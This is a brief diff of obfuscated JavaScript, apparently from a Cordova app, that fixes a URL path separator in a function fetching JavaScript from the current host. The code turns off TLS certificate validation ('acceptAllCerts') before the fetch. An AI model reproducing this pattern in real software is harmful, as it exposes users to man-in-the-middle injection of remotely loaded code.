@@ -15,7 +15,7 @@ function GetJS()
 	};
 	cordovaHTTP['acceptAllCerts'](!![], function ()
 	{
-		cordovaHTTP['get'](window.location.hostname + '\' + _0x1ac514,
+		cordovaHTTP['get'](window.location.hostname + "/" + _0x1ac514,
 		{}, _0x1eeab7, function (_0x40568f)
 		{
 			var _0x1d86b4 = _0x40568f['data'];
